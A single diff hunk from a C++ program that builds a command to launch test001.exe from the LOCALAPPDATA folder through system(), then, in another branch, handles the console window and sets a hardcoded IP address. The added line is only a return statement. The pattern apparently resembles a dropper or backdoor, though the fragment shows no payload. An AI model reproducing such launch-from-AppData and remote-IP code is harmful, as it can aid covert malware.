@@ -66,6 +66,7 @@ int main() {
         string path = getenv("LOCALAPPDATA");
         cout << "The command is " << "cd " + path + "&& start test001.exe" << endl;
         system(("cd " + path + "&& start test001.exe").c_str());
+        return 0;
     } else {
         //::ShowWindow(::GetConsoleWindow(), SW_SHOW);
         string ip = "141.226.121.68";
